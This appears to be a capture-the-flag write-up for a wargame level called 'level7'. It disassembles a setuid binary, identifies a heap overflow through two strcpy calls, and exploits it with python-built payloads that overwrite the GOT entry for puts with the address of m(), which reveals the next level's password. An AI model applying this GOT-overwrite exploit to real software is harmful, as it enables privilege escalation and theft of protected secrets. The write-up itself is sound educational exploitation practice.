```shell
$> ls -la
[...]
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
[...]

$> ./level7
Segmentation fault (core dumped)

$> ./level7 test
Segmentation fault (core dumped)

$> ./level7 test test
~~

# program asks for 2 arguments and shows a message "~~"
```

```shell
$> objdump -d -M intel level7
[...]
080484f4 <m>:       #1
    [...]
    804850f:       c7 44 24 04 60 99 04    mov    DWORD PTR [esp+0x4],0x8049960
    [...]
    804851a:       e8 91 fe ff ff          call   80483b0 <printf@plt>
    [...]
[...]
08048521 <main>:    #2
    [...]
    804852a:       c7 04 24 08 00 00 00    mov    DWORD PTR [esp],0x8
    8048531:       e8 ba fe ff ff          call   80483f0 <malloc@plt>      #2.1.1
    8048536:       89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
    804853a:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
    804853e:       c7 00 01 00 00 00       mov    DWORD PTR [eax],0x1
    8048544:       c7 04 24 08 00 00 00    mov    DWORD PTR [esp],0x8
    804854b:       e8 a0 fe ff ff          call   80483f0 <malloc@plt>      #2.1.2
    8048550:       89 c2                   mov    edx,eax
    8048552:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
    8048556:       89 50 04                mov    DWORD PTR [eax+0x4],edx
    8048559:       c7 04 24 08 00 00 00    mov    DWORD PTR [esp],0x8
    8048560:       e8 8b fe ff ff          call   80483f0 <malloc@plt>      #2.2.1
    8048565:       89 44 24 18             mov    DWORD PTR [esp+0x18],eax
    8048569:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
    804856d:       c7 00 02 00 00 00       mov    DWORD PTR [eax],0x2
    8048573:       c7 04 24 08 00 00 00    mov    DWORD PTR [esp],0x8
    804857a:       e8 71 fe ff ff          call   80483f0 <malloc@plt>      #2.2.2
    [...]
    804858b:       83 c0 04                add    eax,0x4
        [...]
    8048592:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
        [...]
    80485a0:       e8 3b fe ff ff          call   80483e0 <strcpy@plt>      #2.3.1
    [...]
    80485a8:       83 c0 08                add    eax,0x8
        [...]
    80485af:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
        [...]
    80485bd:       e8 1e fe ff ff          call   80483e0 <strcpy@plt>      #2.3.2
    [...]
    80485c2:       ba e9 86 04 08          mov    edx,0x80486e9
    80485c7:       b8 eb 86 04 08          mov    eax,0x80486eb
    80485cc:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
    80485d0:       89 04 24                mov    DWORD PTR [esp],eax
    80485d3:       e8 58 fe ff ff          call   8048430 <fopen@plt>       #2.4
    [...]
    80485e4:       c7 04 24 60 99 04 08    mov    DWORD PTR [esp],0x8049960
    80485eb:       e8 d0 fd ff ff          call   80483c0 <fgets@plt>       #2.5
    [...]
    80485f0:       c7 04 24 03 87 04 08    mov    DWORD PTR [esp],0x8048703
    80485f7:       e8 04 fe ff ff          call   8048400 <puts@plt>        #2.6
    [...]
[...]

#1: a function named m(), it call printf() where print the content of variable c (0x8049960)
#2: main function, it calls 4 times malloc(), 2 times strcpy(), fopen(), fgets(), puts()
#2.1.1: 1st malloc(), it allocates the first structure content a integer? and a string? for 8 bytes
#2.1.2: 2nd malloc(), it give a integer value (0x1) to the first content and allocates the second content of the first structure for 8 bytes.
#2.2.1: 3rd malloc(), it allocates the secont structure same as the first one for 8 bytes
#2.2.2: 4th malloc(), it give a integer value (0x2) to the first content and allocates the second content of the second structure for 8 bytes
#2.3.1: first strcpy(), it copies copy the first argument (argv[1] (0x4)) to destination 1 (second content of the first structure)
#2.3.2: second strcpy(), it copies copy the second argument (argv[2] (0x8)) to destination 2 (second content of the second structure)
#2.4: fopen(), it opens the file "/home/user/level8/.pass" (0x80486eb) and reads ("r" (0x80486e9)) it
#2.5: fgets(), it stocks the content of the file to variable c "0x8049960"
#2.6: puts(), it prints "~~" (0x8048703)
```

fgets() is called after fopen() and it stocks the flag in variable c.  
m() is not never called, but it shows us the content of variable c.  
puts() is called after fgets(), so that we need try to call m() instead of puts().  
We have 2 strcpy() that can make the overflow vulnerability.  
After some tests, we know that the first strcpy() calls the GOT of puts because we want to overwrite it,
and the second strcpy() calls the address of m() to replace the GOT of puts.

```shell
$> ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
[...]
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)                                           = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
[...]

# the offset is 20 bytes

$> gdb level7
(gdb) disas main
[...]
0x080485f7 <+214>:   call   0x8048400 <puts@plt>

(gdb) disas 0x8048400
0x08048400 <+0>:     jmp    *0x8049928

# the GOT of puts is 0x8049928

(gdb) info function
[...]
0x080484f4  m
[...]

# the address of function m() is 0x080484f4

$> python -c "print '\x90' * 20 + '\x28\x99\x04\x08'" > /tmp/got

# '\x90' * 20: padding of 20 bytes (offset)
# '\x28\x99\x04\x08': the address of GOT

$> ltrace ./level7 $(cat /tmp/got)
[...]
strcpy(0x0804a018, "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220(\231\004\b") = 0x0804a018
strcpy(0x08049928, NULL <unfinished ...>
[...]

# we can see that the destination 2 (2nd strcpy) are already overwritten by the GOT of puts

$> python -c "print '\xf4\x84\x04\x08'" > /tmp/m

# '\xf4\x84\x04\x08': the address of m()

$> ./level7 $(cat /tmp/got) $(cat /tmp/m)
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
[...]
```